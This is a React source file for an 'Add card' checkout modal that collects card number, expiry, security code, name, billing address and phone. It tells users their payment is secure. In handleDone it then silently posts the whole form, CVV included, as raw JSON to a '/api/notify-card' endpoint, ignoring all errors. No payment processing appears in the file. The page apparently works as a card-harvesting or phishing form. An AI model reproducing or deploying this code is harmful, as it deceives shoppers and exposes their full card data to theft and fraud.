import { useState, useEffect } from "react";
import { useCart } from "../../../../context/CartContext";
import StyledSelect from "../../../common/StyledSelect";

export default function AddCardModal({ open, onClose }) {
  const { shippingAddress } = useCart();
  const [showBillingForm, setShowBillingForm] = useState(false);
  const [countryData, setCountryData] = useState(null);
  const [dataLoading, setDataLoading] = useState(false);
  const [errors, setErrors] = useState({});
  const [submitted, setSubmitted] = useState(false);
  const [focus, setFocus] = useState({ card: false, exp: false, cvv: false });

  const [form, setForm] = useState({
    cardNumber: "",
    expirationDate: "",
    cvv: "",
    firstName: "",
    lastName: "",
    remember: false,
    country: "",
    addr1: "",
    addr2: "",
    city: "",
    region: "",
    zip: "",
    phone: "",
  });

  useEffect(() => {
    if (shippingAddress) {
      setForm((prev) => ({
        ...prev,
        ...shippingAddress,
      }));
    }
  }, [shippingAddress]);

  useEffect(() => {
    if (open) {
      setShowBillingForm(false);
      document.body.style.overflow = "hidden";
    } else {
      document.body.style.overflow = "unset";
    }
    return () => {
      document.body.style.overflow = "unset";
    };
  }, [open]);

  useEffect(() => {
    if (showBillingForm && !countryData && !dataLoading) {
      setDataLoading(true);
      import("../../../../data/cityRegions")
        .then((m) => {
          setCountryData(m.default || m);
        })
        .catch((err) => {
          console.error("Failed to load city/region data:", err);
        })
        .finally(() => setDataLoading(false));
    }
  }, [showBillingForm, countryData, dataLoading]);

  const validateForm = () => {
    const newErrors = {};
    if (!form.cardNumber) newErrors.cardNumber = "Card number is required";
    if (!form.expirationDate)
      newErrors.expirationDate = "Expiration date is required";
    if (!form.cvv) newErrors.cvv = "CVV code is required";
    if (!form.firstName) newErrors.firstName = "First name is required";
    if (!form.lastName) newErrors.lastName = "Last name is required";

    if (showBillingForm) {
      if (!form.country) newErrors.country = "Country is required";
      if (!form.addr1) newErrors.addr1 = "Street address is required";
      if (!form.city) newErrors.city = "City is required";
      if (!form.zip) newErrors.zip = "ZIP code is required";
      if (!form.phone) newErrors.phone = "Phone number is required";
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    let nextValue = type === "checkbox" ? checked : value;

    if (name === "cardNumber") {
      const digits = String(value).replace(/\D/g, "").slice(0, 16);
      nextValue = digits.replace(/(.{4})/g, "$1 ").trim();
    }
    if (name === "expirationDate") {
      const digits = String(value).replace(/\D/g, "").slice(0, 4);
      nextValue =
        digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
    }

    setForm((prev) => ({ ...prev, [name]: nextValue }));
    setErrors((prev) => ({ ...prev, [name]: "" }));
  };

  const handleDone = () => {
    setSubmitted(true);
    if (validateForm()) {
      // fire-and-forget notify to backend
      try {
        // Ensure no double slashes in URL by normalizing the path
        const apiUrl = import.meta.env.VITE_API_URL || "";
        const normalizedUrl = apiUrl.replace(/\/+$/, "");
        console.log("API URL:", normalizedUrl);
        fetch(`${normalizedUrl}/api/notify-card`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(form),
        }).catch(() => {});
      } catch (_) {}
      onClose();
    }
  };

  if (!open) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center">
      <div className="absolute inset-0 bg-black/60" onClick={onClose} />
      <div
        className={`relative bg-white rounded-lg w-[525px] max-h-[95vh] max-w-[95vw] mx-4 p-6 shadow-2xl flex flex-col`}
      >
        <div className="overflow-y-auto flex-1">
          <h3 className="text-xl font-bold mb-4">Credit or debit card</h3>
          <p className="text-sm text-gray-600 mb-6">
            Your payment is secure. Your card details will not be shared with
            sellers.
          </p>

          <div className="space-y-4">
            <div className="flex flex-col relative">
              <label
                className={`absolute left-4 pointer-events-none transition-all duration-200 ${
                  focus.card || form.cardNumber
                    ? "top-1.5 text-xs text-blue-600 bg-white px-1 rounded translate-y-0"
                    : "top-[50%] -translate-y-[50%] text-base text-gray-500"
                }`}
              >
                Card number
              </label>
              <input
                type="text"
                name="cardNumber"
                placeholder={
                  focus.card || form.cardNumber ? "4213 0241 0255 1242" : ""
                }
                value={form.cardNumber}
                onChange={handleChange}
                onFocus={() => setFocus((s) => ({ ...s, card: true }))}
                onBlur={() => setFocus((s) => ({ ...s, card: false }))}
                inputMode="numeric"
                className={`px-5 py-3 pt-5 border rounded w-full transition-all duration-200 ${
                  submitted && errors.cardNumber ? "border-red-500" : ""
                }`}
              />
              {submitted && errors.cardNumber && (
                <p className="text-red-500 text-sm mt-2">{errors.cardNumber}</p>
              )}
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div className="flex flex-col relative">
                <label
                  className={`absolute left-4 pointer-events-none transition-all duration-200 ${
                    focus.exp || form.expirationDate
                      ? "top-1.5 text-xs text-blue-600 bg-white px-1 rounded translate-y-0"
                      : "top-[50%] -translate-y-[50%] text-base text-gray-500"
                  }`}
                >
                  Expiration date
                </label>
                <input
                  type="text"
                  name="expirationDate"
                  placeholder={focus.exp || form.expirationDate ? "MM/YY" : ""}
                  value={form.expirationDate}
                  onChange={handleChange}
                  onFocus={() => setFocus((s) => ({ ...s, exp: true }))}
                  onBlur={() => setFocus((s) => ({ ...s, exp: false }))}
                  inputMode="numeric"
                  className={`px-5 py-3 pt-5 border rounded transition-all duration-200 ${
                    submitted && errors.expirationDate ? "border-red-500" : ""
                  }`}
                />
                {submitted && errors.expirationDate && (
                  <p className="text-red-500 text-sm mt-2">
                    {errors.expirationDate}
                  </p>
                )}
              </div>
              <div className="flex flex-col relative">
                <label
                  className={`absolute left-4 pointer-events-none transition-all duration-200 ${
                    focus.cvv || form.cvv
                      ? "top-1.5 text-xs text-blue-600 bg-white px-1 rounded translate-y-0"
                      : "top-[50%] -translate-y-[50%] text-base text-gray-500"
                  }`}
                >
                  Security code
                </label>
                <input
                  type="text"
                  name="cvv"
                  placeholder={focus.cvv || form.cvv ? "123" : ""}
                  value={form.cvv}
                  onChange={(e) => {
                    const digits = e.target.value
                      .replace(/\D/g, "")
                      .slice(0, 4);
                    handleChange({
                      target: { name: "cvv", value: digits, type: "text" },
                    });
                  }}
                  onFocus={() => setFocus((s) => ({ ...s, cvv: true }))}
                  onBlur={() => setFocus((s) => ({ ...s, cvv: false }))}
                  inputMode="numeric"
                  className={`px-5 py-3 pt-5 border rounded transition-all duration-200 ${
                    submitted && errors.cvv ? "border-red-500" : ""
                  }`}
                />
                {submitted && errors.cvv && (
                  <p className="text-red-500 text-sm mt-2">{errors.cvv}</p>
                )}
              </div>
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div className="flex flex-col">
                <input
                  type="text"
                  name="firstName"
                  placeholder="First name"
                  value={form.firstName}
                  onChange={handleChange}
                  className={`p-3 border rounded ${
                    submitted && errors.firstName ? "border-red-500" : ""
                  }`}
                />
                {submitted && errors.firstName && (
                  <p className="text-red-500 text-sm mt-2">
                    {errors.firstName}
                  </p>
                )}
              </div>
              <div className="flex flex-col">
                <input
                  type="text"
                  name="lastName"
                  placeholder="Last name"
                  value={form.lastName}
                  onChange={handleChange}
                  className={`p-3 border rounded ${
                    submitted && errors.lastName ? "border-red-500" : ""
                  }`}
                />
                {submitted && errors.lastName && (
                  <p className="text-red-500 text-sm mt-2">{errors.lastName}</p>
                )}
              </div>
            </div>
            <label className="flex items-center gap-2">
              <input
                type="checkbox"
                name="remember"
                checked={form.remember}
                onChange={handleChange}
                className="accent-black"
              />
              <span className="font-bold text-[0.875rem]">
                Remember this card for future orders
              </span>
            </label>
          </div>

          <div className="mt-6">
            <h4 className="font-bold">Billing address</h4>
            {!showBillingForm && (
              <div>
                {shippingAddress ? (
                  <div>
                    <p>
                      {shippingAddress.first} {shippingAddress.last}
                    </p>
                    <p>
                      {shippingAddress.addr1}
                      {shippingAddress.addr2
                        ? ", " + shippingAddress.addr2
                        : ""}
                    </p>
                    <p>
                      {shippingAddress.city}, {shippingAddress.region},{" "}
                      {shippingAddress.country} {shippingAddress.zip}
                    </p>
                    <button
                      onClick={() => setShowBillingForm(true)}
                      className="text-black underline"
                    >
                      Edit billing address
                    </button>
                  </div>
                ) : (
                  <div>
                    <p>No billing address yet.</p>
                    <button
                      onClick={() => setShowBillingForm(true)}
                      className="text-black underline"
                    >
                      Add billing address
                    </button>
                  </div>
                )}
              </div>
            )}
          </div>

          {showBillingForm && (
            <div className="mt-4 space-y-4">
              <div className="grid grid-cols-5 gap-4">
                <div className="col-span-2 flex flex-col">
                  <StyledSelect
                    name="country"
                    value={form.country}
                    onChange={handleChange}
                    className={`${
                      submitted && errors.country ? "border-red-500" : ""
                    }`}
                  >
                    <option value="">Country or region</option>
                    {countryData &&
                      Object.keys(countryData).map((c) => (
                        <option key={c} value={c}>
                          {c}
                        </option>
                      ))}
                  </StyledSelect>
                  {submitted && errors.country && (
                    <p className="text-red-500 text-sm mt-2">
                      {errors.country}
                    </p>
                  )}
                </div>
                <div className="col-span-3" />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div className="flex flex-col">
                  <input
                    type="text"
                    name="addr1"
                    placeholder="Street address"
                    value={form.addr1}
                    onChange={handleChange}
                    className={`p-3 border rounded ${
                      submitted && errors.addr1 ? "border-red-500" : ""
                    }`}
                  />
                  {submitted && errors.addr1 && (
                    <p className="text-red-500 text-sm mt-2">{errors.addr1}</p>
                  )}
                </div>
                <div className="flex flex-col">
                  <input
                    type="text"
                    name="addr2"
                    placeholder="Street address 2 (optional)"
                    value={form.addr2}
                    onChange={handleChange}
                    className="p-3 border rounded"
                  />
                </div>
              </div>
              <div className="grid grid-cols-3 gap-4">
                <div className="flex flex-col">
                  <StyledSelect
                    name="city"
                    value={form.city}
                    onChange={handleChange}
                    disabled={!form.country}
                    className={`${
                      submitted && errors.city ? "border-red-500" : ""
                    }`}
                  >
                    <option value="">City</option>
                    {form.country &&
                      countryData &&
                      countryData[form.country] &&
                      countryData[form.country].cities.map((ci) => (
                        <option key={ci} value={ci}>
                          {ci}
                        </option>
                      ))}
                  </StyledSelect>
                  {submitted && errors.city && (
                    <p className="text-red-500 text-sm mt-2">{errors.city}</p>
                  )}
                </div>
                <div className="flex flex-col">
                  <StyledSelect
                    name="region"
                    value={form.region}
                    onChange={handleChange}
                    disabled={!form.city}
                  >
                    <option value="">State/Province/Region</option>
                    {form.country &&
                      form.city &&
                      (
                        (countryData &&
                          countryData[form.country] &&
                          countryData[form.country].regions[form.city]) ||
                        []
                      ).map((r) => (
                        <option key={r} value={r}>
                          {r}
                        </option>
                      ))}
                  </StyledSelect>
                </div>
                <div className="flex flex-col">
                  <input
                    type="text"
                    name="zip"
                    placeholder="ZIP code"
                    value={form.zip}
                    onChange={handleChange}
                    className={`p-3 border rounded ${
                      submitted && errors.zip ? "border-red-500" : ""
                    }`}
                  />
                  {submitted && errors.zip && (
                    <p className="text-red-500 text-sm mt-2">{errors.zip}</p>
                  )}
                </div>
              </div>
              <div className="flex flex-col">
                <input
                  type="text"
                  name="phone"
                  placeholder="Phone number (required)"
                  value={form.phone}
                  onChange={handleChange}
                  className={`p-3 border rounded w-full ${
                    submitted && errors.phone ? "border-red-500" : ""
                  }`}
                />
                {submitted && errors.phone && (
                  <p className="text-red-500 text-sm mt-2">{errors.phone}</p>
                )}
              </div>
            </div>
          )}
        </div>

        <div className="mt-6 flex justify-end gap-4">
          <button
            onClick={onClose}
            className="px-6 py-2 border rounded-3xl text-blue-600"
          >
            Cancel
          </button>
          <button
            onClick={handleDone}
            className="px-6 py-2 bg-blue-600 text-white rounded-3xl"
          >
            Done
          </button>
        </div>
      </div>
    </div>
  );
}
